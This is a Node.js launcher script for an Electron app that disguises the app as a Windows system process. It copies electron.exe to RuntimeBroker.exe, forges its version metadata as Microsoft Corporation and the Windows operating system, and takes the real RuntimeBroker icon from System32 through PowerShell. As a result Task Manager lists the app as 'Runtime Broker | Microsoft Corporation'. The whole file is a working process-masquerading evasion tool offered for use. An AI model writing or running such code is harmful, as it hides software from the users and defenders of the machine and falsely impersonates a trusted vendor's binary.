/**
 * start_stealth.js — System Process Disguise Launcher
 * 
 * Makes the Electron app indistinguishable from a real Windows system process:
 * 1. Copies electron.exe → RuntimeBroker.exe
 * 2. Patches the .exe version info (Publisher, Description, Copyright) using rcedit
 * 3. Extracts the REAL RuntimeBroker.exe icon from C:\Windows\System32
 * 4. Launches the app — Task Manager shows "Runtime Broker | Microsoft Corporation"
 */

const { spawn, execSync } = require('child_process');
const fs = require('fs');
const path = require('path');
const os = require('os');

const electronDistDir = path.join(__dirname, 'node_modules', 'electron', 'dist');
const originalExe = path.join(electronDistDir, 'electron.exe');
const targetExeName = 'RuntimeBroker.exe';
const targetExe = path.join(electronDistDir, targetExeName);
const patchedMarker = path.join(electronDistDir, '.rtbroker_patched');

// ── Step 1: Copy electron.exe → RuntimeBroker.exe ───────────────────────────
if (!fs.existsSync(originalExe)) {
  console.error('[Launcher] electron.exe not found. Run npm install first.');
  process.exit(1);
}

if (!fs.existsSync(targetExe)) {
  console.log(`[Launcher] Copying electron.exe → ${targetExeName}...`);
  fs.copyFileSync(originalExe, targetExe);
}

// ── Step 2: Patch version info with rcedit ──────────────────────────────────
async function patchExecutable() {
  // Skip if already patched
  if (fs.existsSync(patchedMarker)) {
    return;
  }

  console.log('[Launcher] Patching executable version info...');

  // Find rcedit binary — installed via npm
  let rceditPath = null;
  const possiblePaths = [
    path.join(__dirname, 'node_modules', 'rcedit', 'bin', 'rcedit-x64.exe'),
    path.join(__dirname, 'node_modules', 'rcedit', 'bin', 'rcedit.exe'),
    path.join(__dirname, 'node_modules', '@electron', 'rcedit', 'bin', 'rcedit-x64.exe'),
    path.join(__dirname, 'node_modules', '@electron', 'rcedit', 'bin', 'rcedit.exe'),
  ];

  for (const p of possiblePaths) {
    if (fs.existsSync(p)) {
      rceditPath = p;
      break;
    }
  }

  if (rceditPath) {
    // Use rcedit binary directly — fastest and most reliable
    const patches = [
      ['--set-version-string', 'CompanyName', 'Microsoft Corporation'],
      ['--set-version-string', 'FileDescription', 'Runtime Broker'],
      ['--set-version-string', 'InternalName', 'RuntimeBroker.exe'],
      ['--set-version-string', 'LegalCopyright', '© Microsoft Corporation. All rights reserved.'],
      ['--set-version-string', 'OriginalFilename', 'RuntimeBroker.exe'],
      ['--set-version-string', 'ProductName', 'Microsoft® Windows® Operating System'],
      ['--set-file-version', '10.0.26100.1'],
      ['--set-product-version', '10.0.26100.1'],
    ];

    for (const args of patches) {
      try {
        if (args.length === 3) {
          execSync(`"${rceditPath}" "${targetExe}" ${args[0]} "${args[1]}" "${args[2]}"`, { stdio: 'ignore', windowsHide: true, timeout: 15000 });
        } else {
          execSync(`"${rceditPath}" "${targetExe}" ${args[0]} "${args[1]}"`, { stdio: 'ignore', windowsHide: true, timeout: 15000 });
        }
      } catch (_) {}
    }
    console.log('[Launcher] Version info patched successfully.');
    fs.writeFileSync(patchedMarker, Date.now().toString(), 'utf8');
    return;
  }

  // Fallback: skip patching but still run
  console.log('[Launcher] rcedit not found. Run: npm install --save-dev rcedit');
  console.log('[Launcher] App will still run as RuntimeBroker.exe but without Microsoft metadata.');
}

// ── Step 3: Extract real RuntimeBroker icon from System32 ───────────────────
function extractSystemIcon() {
  const iconMarker = path.join(electronDistDir, '.icon_extracted');
  if (fs.existsSync(iconMarker)) return;

  const realExe = 'C:\\Windows\\System32\\RuntimeBroker.exe';
  if (!fs.existsSync(realExe)) return;

  try {
    // Use PowerShell to extract the icon from the real system RuntimeBroker.exe
    const iconPath = path.join(electronDistDir, 'RuntimeBroker_system.ico');
    const ps = `
$source = '${realExe.replace(/\\/g, '\\\\')}';
$target = '${iconPath.replace(/\\/g, '\\\\')}';
Add-Type -AssemblyName System.Drawing;
$icon = [System.Drawing.Icon]::ExtractAssociatedIcon($source);
$stream = [System.IO.File]::Create($target);
$icon.Save($stream);
$stream.Close();
$icon.Dispose();
`;
    execSync(`powershell -NoProfile -NonInteractive -Command "${ps.replace(/"/g, '\\"').replace(/\n/g, ' ')}"`, {
      windowsHide: true,
      stdio: 'ignore',
      timeout: 10000
    });

    // Apply the extracted icon to our exe using rcedit
    if (fs.existsSync(iconPath)) {
      const possibleRcedit = [
        path.join(__dirname, 'node_modules', '@electron', 'rcedit', 'bin', 'rcedit-x64.exe'),
        path.join(__dirname, 'node_modules', 'rcedit', 'bin', 'rcedit-x64.exe'),
      ];
      for (const rc of possibleRcedit) {
        if (fs.existsSync(rc)) {
          try {
            execSync(`"${rc}" "${targetExe}" --set-icon "${iconPath}"`, { stdio: 'ignore', windowsHide: true });
            console.log('[Launcher] System icon applied.');
          } catch (_) {}
          break;
        }
      }
      fs.writeFileSync(iconMarker, Date.now().toString(), 'utf8');
    }
  } catch (e) {
    console.log('[Launcher] Icon extraction skipped:', e.message);
  }
}

// ── Step 4: Launch the main app ──────────────────────────────────────────────
async function main() {
  await patchExecutable();
  extractSystemIcon();

  // Start main Electron app
  console.log(`[Launcher] Starting ${targetExeName}...`);
  const child = spawn(targetExe, ['main.js'], {
    stdio: 'inherit',
    windowsHide: false
  });

  child.on('close', (code) => {
    process.exit(code);
  });
}

main();
